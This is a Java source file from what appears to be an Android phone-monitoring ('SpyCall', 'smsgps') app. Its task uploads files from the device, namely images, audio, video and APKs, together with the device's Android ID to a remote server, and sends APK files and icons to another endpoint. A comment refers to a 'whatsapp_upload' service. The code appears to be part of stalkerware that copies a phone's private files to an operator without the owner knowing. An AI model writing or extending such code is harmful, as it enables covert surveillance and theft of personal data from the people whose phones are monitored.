/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;

import org.json.JSONObject;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.provider.Settings.Secure;
import android.util.Log;
import android.widget.Toast;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.InstalledApp;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.secure.smsgps.DeviceInterface;

public class FileUploadAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "FileUploadAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	Bitmap resized;
	String path;
	String files,type;
	
	private InstalledApp[] latestInstalledApp; 
	
	public FileUploadAsyncTask(Context ctx, String path, String string, String type) {
		this.ctx=ctx;
		this.path = path;
		this.files = string;
		this.type = type;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {
		try{
			postFiles(path,files);
		}catch(Exception e){
			e.printStackTrace();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) { 

	}
	
	/*********************** Start Installed App *********************/

	public final  void  postFiles(String path, String files) {
				double length = 0; 
				try {
							ArrayList<String[]> arraylist1 = new ArrayList<String[]>();
						
							String a[] = { "upload_device_id",  Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID)};
							arraylist1.add(a);
							String b[] = { "type",type }; // image =1, audio = 3, video= 2, apk - 4, others - 5
							arraylist1.add(b);
							String c[] = { "path",path };
							arraylist1.add(c);
							
							ArrayList<String> arraylist2 = new ArrayList<String>();
							arraylist2.add(path+files);
							
							String completePath = path+files;
							// Split path into segments
							String segments[] = completePath.split("\\.");
							// Grab the last segment
							String extention = segments[segments.length - 1];
							
							String completeFileNAme = files;
							// Split path into segments
							String completeFileNAmeArr[] = completeFileNAme.split("\\.");
							String fileName = completeFileNAmeArr[completeFileNAmeArr.length - 2];
							
							try
							{
						        File file = new File(completePath);
						        length = file.length();
						        length = length/1024;
						        System.out.println("File Path : " + file.getPath() + ", File size : " + length +" KB");
						    }catch(Exception e){
						        System.out.println("File not found : " + e.getMessage() + e);
						    }
						     
						    double lengthinMb = length/1024;
						    if(lengthinMb > 5)
						    {
						    	Toast.makeText(ctx, "File size is greater than 5 MB", Toast.LENGTH_SHORT).show();
						    }
						    else
						    {
						    	JsonPostRequest postrequest = new JsonPostRequest();
								String imageResponse = postrequest.doPostWithFile2(ConnectUrl.URL_File_Upload, arraylist1,arraylist2,fileName, extention);
								System.out.println(imageResponse); 
						    }
							
							//String getResponceMusic = uploadDeviceMusic(data,track,data, "","","",byteArray);
						
				} catch (Exception e) {
					e.printStackTrace();
				}
		          
			//	applicationname = packs.get(i).applicationInfo.loadLabel( ctx.getPackageManager()).toString();
			//	version = packs.get(i).versionName;
				
			//	final long installedDate = getallapptime(packageName);
			//	latestInstalledApp[i]=new InstalledApp(Uri.encode(applicationname),Uri.encode(packageName),version,installedDate);
				
			//}
			
			//maindata();

			//return installedAppDetail;
			/*final int totalCount=preInstallAppCount+remaningInstallAppCount;
			try {
				if (Utility.isNetworkAvailable(ctx)) {
					int imagePreCount=preInstallAppCount + pp;
					//new YourAsyncTask_ImagesDetail().execute(apkPath, applicationname,  + totalCount, preInstallAppCount+ "",remaningInstallAppCount+"");
					new YourAsyncTask_ImagesDetail().execute(apkPath, apk_name, totalCount+ "",imagePreCount+"");
					//new InstalledAppPostAsyncTask().execute(installedAppDetail,totalCount+"");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}*/
		
	}
	
	public static Bitmap drawableToBitmap (Drawable drawable) {
	    if (drawable instanceof BitmapDrawable) {
	        return ((BitmapDrawable)drawable).getBitmap();
	    }

	    int width = drawable.getIntrinsicWidth();
	    width = width > 0 ? width : 1;
	    int height = drawable.getIntrinsicHeight();
	    height = height > 0 ? height : 1;

	    Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
	    Canvas canvas = new Canvas(bitmap); 
	    drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
	    drawable.draw(canvas);

	    return bitmap;
	}
	
	
	public final long getallapptime(String packageName){
		final PackageManager pm = ctx.getPackageManager();
		ApplicationInfo appInfo = null;
		try {
			appInfo = pm.getApplicationInfo(packageName, 0);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		final String appFile = appInfo.sourceDir;

		final long installed = new File(appFile).lastModified();
		return installed;
	}

	@SuppressWarnings({ "unchecked", "rawtypes" })
	public final void maindata() {
		Arrays.sort( latestInstalledApp, new Comparator()
		{
			public int compare(Object o1, Object o2) {
				return new Long(((InstalledApp)o1).getInstalledDate()).compareTo(new Long(((InstalledApp) o2).getInstalledDate()));
			}
		});
	}
	
	class YourAsyncTask_ImagesDetail extends AsyncTask<String, Void, Void> {

		int getcountImage=0;
		int getRemainingCount;
		String getResponceImages;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage=Integer.parseInt(params[2]);
				getRemainingCount=Integer.parseInt(params[3]);
				getResponceImages = uploadImage2(params[0], params[1]);

				JSONObject responseObject = new JSONObject(getResponceImages);
				//JSONArray responseArray = responseObject.getJSONArray("upload");
				JSONObject JsonResponse =responseObject.getJSONObject("response");
				if(JsonResponse.getString("apk").toString().contains("Apk file uploaded successfully"))
				{
					SpyCallSharedPrefrence.saveINSTALL_APP_Icon_PreCount(ctx,Integer.parseInt(params[3]));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {			
		}
	}

	public String uploadImage2(String newFilePath, String appname) {
	
		String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		Log.i("resonse", "anotherone");
		File file = new File(newFilePath);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String a[] = { "apk_name",appname};
		arraylist1.add(a);
		/*String b[] = { "user_id",getUserID_SP };
		arraylist1.add(b); */
		String c[] = { "upload_device_id", android_id };
		arraylist1.add(c); 
		
		JsonPostRequest postrequest = new JsonPostRequest();
		//http://evt17.com/iphone/android_services/whatsapp_upload
		String imageResponse = postrequest.doPostWithApkFile(ConnectUrl.URL_Apk_Icon_upload, arraylist1,arraylist2,appname);
		arraylist2.clear();
		arraylist1.clear();         
		return imageResponse;
	}
}
